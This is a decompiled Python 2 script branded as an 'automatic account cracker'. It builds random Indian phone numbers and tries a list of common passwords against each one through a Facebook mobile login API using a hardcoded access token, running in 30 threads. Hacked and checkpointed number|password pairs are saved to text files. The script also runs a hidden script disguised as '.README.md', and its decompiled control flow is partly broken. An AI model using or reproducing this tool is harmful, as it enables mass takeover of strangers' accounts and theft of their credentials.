
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Source File : a.py
# Time : Wed Sep  9 04:27:21 2020
#---------------------------------------
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <tahm1d>
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(98969):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = "\n\x1b[1;91m   ______  \x1b[1;95m  _____ __     __)\x1b[1;92m ______\n \x1b[1;91m (, /    )\x1b[1;97m (, /  (, /|  / \x1b[1;92m  (, /    )\n \x1b[1;91m   /---(    \x1b[1;93m /     / | /  \x1b[1;92m    /    /\n\x1b[1;91m ) / ____)\x1b[1;94m___/__ ) /  |/   \x1b[1;92m  _/___ /_\n\x1b[1;91m(_/ (   (__\x1b[1;96m /   (_/   '   \x1b[1;92m (_/___ /                          \n\x1b[1;90m        AUTOMATIC ACCOUNT CRACKER BY \x1b[1;96mBOTOL BABA\n\x1b[1;97m--------------------------------------------------\n\x1b[1;95m\n AUTHOR     : MEHEDI HASAN ARIYAN\n FACEBOOK   : FACEBOOK.COM/THEMEHTAN\n YOUTUBE    : YOUTUBE.COM/MASTERTRICK1\n GITHUB     : GITHUB.COM/BOTOLMEHEDI\n\x1b[1;32m\n--------------------------------------------------\n                                "
back = 0
successful = []
cpb = []
oks = []
id = []

def babaindseven():
    os.system('clear')
    print logo
    print 'CRACK ONLY 7 DIGITS HACKABLE ACCOUNTS'
    print
    jalan('\x1b[1;91m     [1]  \x1b[1;93mSTART CRACK')
    print
    jalan('\x1b[1;92m     [2]  UPDATE TOOL')
    print
    jalan('\x1b[1;96m     [3]  BACK TO HOME')
    print
    jalan('\x1b[1;97m     [0]  EXIT')
    print 50 * '-'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n  ===>   ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 954 TO 997  :  ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            babaindseven()

    elif bch == '2':
        os.system('clear')
        os.system('pip2 install --upgrade babaindseven')
        os.system('clear')
        print logo
        print
        psb('7 DIGIT INDIAN CRACKER UPDATED SUCCESSFULLY')
        time.sleep(2)
        os.system('python2 .README.md')
    elif bch == '3':
        os.system('python2 .README.md')
    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] TOTAL NUMBERS: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] PLEASE WAIT, PROCESS IS RUNNING ...')
    time.sleep(0.5)
    psb('[!] TO STOP THIS PROCESS PRESS Ctrl THEN z')
    time.sleep(0.5)
    print 50 * '-'
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = 'Facebook'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'Pakistan786'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass4 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass4 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                            pass5 = 'Rahul123'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass5 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass5 + '\n')
                cps.close()
                cpb.append(c + user + pass5)
            else:
                pass6 = 'sayang'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass6 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass6 + '\n')
                    okb.close()
                    oks.append(c + user + pass6)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass6 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass6 + '\n')
                    cps.close()
                    cpb.append(c + user + pass6)
                else:
                    pass7 = 'Jaisriram'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass7 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass7 + '\n')
                        okb.close()
                        oks.append(c + user + pass7)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass7 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass7 + '\n')
                        cps.close()
                        cpb.append(c + user + pass7)
                    else:
                        pass8 = 'jancuk123'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass8 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass8 + '\n')
                            okb.close()
                            oks.append(c + user + pass8)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass8 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass8 + '\n')
                            cps.close()
                            cpb.append(c + user + pass8)
                            pass9 = 'programmer123'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass9 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass9 + '\n')
                okb.close()
                oks.append(c + user + pass9)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass9 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass9 + '\n')
                cps.close()
                cpb.append(c + user + pass9)
            else:
                pass10 = 'loginadmin'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass10 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass10 + '\n')
                    okb.close()
                    oks.append(c + user + pass10)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass10 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass10 + '\n')
                    cps.close()
                    cpb.append(c + user + pass10)
                else:
                    pass11 = 'kontol'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass11 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass11 + '\n')
                        okb.close()
                        oks.append(c + user + pass11)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass11 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass11 + '\n')
                        cps.close()
                        cpb.append(c + user + pass11)
                    else:
                        pass12 = 'Arjun123'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass12 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass12 + '\n')
                            okb.close()
                            oks.append(c + user + pass12)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass12 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass12 + '\n')
                            cps.close()
                            cpb.append(c + user + pass12)
                            pass13 = '801639'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass13 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass13 + '\n')
                okb.close()
                oks.append(c + user + pass13)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass13 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass13 + '\n')
                cps.close()
                cpb.append(c + user + pass13)
            else:
                pass14 = '926291'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass14 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass14 + '\n')
                    okb.close()
                    oks.append(c + user + pass14)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass14 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass14 + '\n')
                    cps.close()
                    cpb.append(c + user + pass14)
                else:
                    pass15 = 'IDONTKNOW'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass15 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass15 + '\n')
                        okb.close()
                        oks.append(c + user + pass15)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass15 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass15 + '\n')
                        cps.close()
                        cpb.append(c + user + pass15)
                    else:
                        pass16 = 'bharat'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass16 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass16 + '\n')
                            okb.close()
                            oks.append(c + user + pass16)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass16 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass16 + '\n')
                            cps.close()
                            cpb.append(c + user + pass16)
                            pass17 = 'mypassword'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass17 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass17 + '\n')
                okb.close()
                oks.append(c + user + pass17)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass17 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass17 + '\n')
                cps.close()
                cpb.append(c + user + pass17)
            else:
                pass18 = 'password@'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass18 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass18 + '\n')
                    okb.close()
                    oks.append(c + user + pass18)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass18 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass18 + '\n')
                    cps.close()
                    cpb.append(c + user + pass18)
                else:
                    pass19 = 'Mehedi12'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass19 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass19 + '\n')
                        okb.close()
                        oks.append(c + user + pass19)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass19 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass19 + '\n')
                        cps.close()
                        cpb.append(c + user + pass19)
                    else:
                        pass20 = 'Rahul123'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass20 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass20 + '\n')
                            okb.close()
                            oks.append(c + user + pass20)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass20 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass20 + '\n')
                            cps.close()
                            cpb.append(c + user + pass20)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    babaindseven()